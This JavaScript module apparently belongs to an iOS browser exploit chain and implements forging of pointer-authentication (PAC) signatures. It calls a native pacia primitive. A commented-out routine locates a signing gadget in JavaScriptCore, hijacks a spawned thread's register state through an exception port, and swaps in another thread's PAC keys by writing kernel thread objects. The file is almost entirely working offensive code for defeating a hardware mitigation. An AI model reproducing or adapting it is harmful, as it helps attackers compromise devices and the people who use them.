//import Chain from "libs/Chain/Chain";
//import Native from "libs/JSUtils/Native";
//import Utils from "libs/JSUtils/Utils";
//import Exception from "./Exception";
//import Task from "./Task";
//import Thread from "./Thread";
//import ThreadState from "./ThreadState";
//import ExceptionMessageStruct from "./ExceptionMessageStruct";
//import Offsets from "Driver/Offsets";

const TAG = "PAC";

export default class PAC
{
	static gadget_pacia;

	static {
		//this.#findGadgets();
	}
	static remotePACLocal(address, modifier)
	{
		address = address & 0x7fffffffffn;
		//console.log(TAG,`address:${Utils.hex(address)}, modifier:${Utils.hex(modifier)}`);
		let signedAddress = pacia(address, BigInt(modifier));
		//console.log(TAG,`signedAddress:${Utils.hex(signedAddress)}`);
		return signedAddress;
	}
	static remotePAC(threadAddr, address, modifier)
	{
		return Native.pacia(address, modifier);
		
		//return this.remotePACLocal(address, modifier);
		/*
		if (!this.gadget_pacia)
		{
			console.log(TAG,`Doesn't have gadget_pacia, aborting`);
			return 0;
		}
		address = address & 0x7fffffffffn;

		let signedAddress = 0n;

		// Get PAC keys of remote thread
		let keyA = Thread.getRopPid(threadAddr);
		let keyB = Thread.getJopPid(threadAddr);

		//console.log(TAG,`Key A:${Utils.hex(keyA)}`);
		//console.log(TAG,`Key B:${Utils.hex(keyB)}`);

		let kr = 0;
		let pacThread = Native.mem;
		Native.callSymbol("thread_create", 0x203, pacThread);
		let buffRes = Native.read(pacThread, Utils.UINT32_SIZE);
		let viewRes = new DataView(buffRes);
		pacThread = viewRes.getUint32(0,true);
		//console.log(TAG,`pacThread:${Utils.hex(pacThread)}`);
		let stack = Native.callSymbol("malloc",0x4000n);
		let sp = stack + 0x2000n;
		let stateBuff = new ArrayBuffer(Utils.ARM_THREAD_STATE64_SIZE);
		let state = new ThreadState(stateBuff);
		state.opaque_sp = sp;
		//arm_thread_state64_set_pc_fptr(state, (void*)gadget_pacia);
		let outputBuffer = Native.mem;
		//console.log(TAG,`Before pacia`);
		if(pacia)
			state.opaque_pc = pacia(this.gadget_pacia,Utils.ptrauth_string_discriminator("pc"));
		else
			state.opaque_pc = Native.callSymbol("pacia",this.gadget_pacia,Utils.ptrauth_string_discriminator("pc"),Utils.ptrauth_key_asia);	
		const buildVer = Offsets.getBuildVersion();
		if(buildVer && buildVer.startsWith("22"))
		{
			//console.log(TAG, "Applying 18 fix");
			//state.opaque_lr = 0x401n;
			state.opaque_lr = pacia(0x401n,Utils.ptrauth_string_discriminator("lr"));
		}
		//console.log(TAG,`After pacia with pc:${state.opaque_pc}`);
		//state.opaque_pc = Native.callSymbol("pacia",this.gadget_pacia,Utils.ptrauth_string_discriminator("pc"),Utils.ptrauth_key_asia);
		state.registers.set(0,outputBuffer);
		state.registers.set(1,BigInt(address));
		state.registers.set(2,BigInt(modifier));
		state.registers.set(3,BigInt(pacThread));
		state.registers.set(16,BigInt(address));
		state.registers.set(17,BigInt(modifier));

		let exceptionPort = Exception.createPort();
		if (!exceptionPort)
		{
			console.log(TAG,`Cannot create exception port`);
			this.#cleanup(pacThread,exceptionPort,stack);
			return 0n;
		}

		//console.log(TAG,`Exception port:${Utils.hex(exceptionPort)}`);

		kr = Native.callSymbol("thread_set_exception_ports",
			pacThread,
			Utils.EXC_MASK_BAD_ACCESS,
			exceptionPort,
			Utils.EXCEPTION_STATE | Utils.MACH_EXCEPTION_CODES,
			BigInt(Utils.ARM_THREAD_STATE64));
		
		if (kr != 0)
		{
			console.log(`thread_set_exception_ports failed:${kr}`);
			this.#cleanup(pacThread,exceptionPort,stack);
			return 0n;
		}
		let pacThreadAddr = Task.getPortKObject(BigInt(pacThread));
		//console.log(TAG,`PAC thread address:${Utils.hex(pacThreadAddr)}`);
		if (!this.#setThreadState(pacThread, pacThreadAddr, stateBuff))
		{
			console.log(TAG,`Failed to set thread state`);
			this.#cleanup(pacThread,exceptionPort,stack);
			return 0n;
		}
		// Change pacThread PAC keys with those of remote thread
		Thread.setPACKeys(pacThreadAddr, keyA, keyB);
		//console.log(TAG,`Starting PAC thread...`);
		Native.callSymbol("thread_resume",pacThread);
		let excBuffer = Native.mem;
		if (!Exception.waitException(exceptionPort, excBuffer, 100, false))
		{
			console.log(TAG,`Failed to receive exception from PAC thread`);
			this.#cleanup(pacThread,exceptionPort,stack);
			return 0n;
		}
		let excRes = Native.read(excBuffer,Number(Exception.ExceptionMessageSize));
		let exc = new ExceptionMessageStruct(excRes);
		signedAddress = exc.threadState.registers.get(16);
		//console.log(TAG,`Signed address: ${Utils.hex(address)} -> signedAddress:${Utils.hex(signedAddress)}`);
		this.#cleanup(pacThread, exceptionPort, stack);
		return signedAddress;
		*/
	}

	/*
	static #findGadgets()
	{
		let sym = Native.dlsym("_ZNK3JSC13JSArrayBuffer8isSharedEv");
		if (!sym)
		{
			console.log(TAG,`Symbol not found`);
			return false;
		}

		let symStripped = sym & ~0xffffff8000000000n;
		let gadgetOpcodesBuff = new ArrayBuffer(20);
		let gadgetOpcodesView = new DataView(gadgetOpcodesBuff);
		gadgetOpcodesView.setUint32(0,0xDAC10230,true);
		gadgetOpcodesView.setUint32(4,0x9A9003E8,true);
		gadgetOpcodesView.setUint32(8,0xF100011F,true);
		gadgetOpcodesView.setUint32(12,0x1A9F07E0,true);
		gadgetOpcodesView.setUint32(16,0xD65F03C0,true);
		let data = Native.read(symStripped,0x1000);
		let gadgetOffset = Utils.memmem(data,gadgetOpcodesBuff);
		if (!gadgetOffset)
		{
			console.log(TAG,`pacia_gadget offset not found`);
			return false;
		}
		this.gadget_pacia = symStripped + BigInt(gadgetOffset);

		console.log(TAG,`Gadgets found: pacia=${Utils.hex(this.gadget_pacia)}`);

		return true;
	}

	static #setThreadState(thread,threadAddr,stateBuff)
	{
		let options = Thread.getOptions(threadAddr);
		options |= 0x8000;	
		Thread.setOptions(threadAddr, options);
		let stateMem = Native.mem;
		Native.write(stateMem,stateBuff);
		//console.log(TAG,`thread:${Utils.hex(thread)}`);
		let kr = Native.callSymbol("thread_set_state",
			thread,
			BigInt(Utils.ARM_THREAD_STATE64),
			stateMem,
			BigInt(Utils.ARM_THREAD_STATE64_COUNT));
		if (kr != 0)
		{
			console.log(TAG,`Failed thread_set_state with error:${kr}`);
			return false;
		}

		options &= ~0x8000;
		Thread.setOptions(threadAddr, options);
		return true;
	}

	static #cleanup(pacThread,exceptionPort,stack)
	{
		Native.callSymbol("thread_terminate",pacThread);
		Native.callSymbol("mach_port_destruct",0x203, exceptionPort, 0n, 0n);
		Native.callSymbol("free",stack);
	}
	*/
}